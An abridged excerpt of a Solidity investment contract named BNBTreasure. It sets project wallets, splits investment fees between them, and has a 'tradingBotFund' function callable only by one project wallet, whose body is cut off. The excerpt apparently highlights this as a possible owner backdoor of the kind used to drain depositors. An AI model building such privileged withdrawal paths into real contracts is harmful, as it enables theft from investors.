...
contract BNBTreasure {
	...
	address payable public proj1Wallet;
	address payable public proj2Wallet;
	...
	constructor(address payable proj1Addr, address payable proj2Addr, address payable devAddr, uint256 start) public {
		require(!isContract(proj1Addr) && !isContract(proj2Addr) && !isContract(devAddr));
		proj1Wallet = proj1Addr;
		proj2Wallet = proj2Addr;
		devWallet = devAddr;
	...
	function invest(address referrer, uint8 plan) public payable {
		...
		proj1Wallet.transfer(pFee.div(2));
		proj2Wallet.transfer(pFee.div(2));
	...
	function tradingBotFund(uint256 _amount) payable external {
        require(msg.sender==proj1Wallet,'Permission denied');
        if (_amount > 0) {
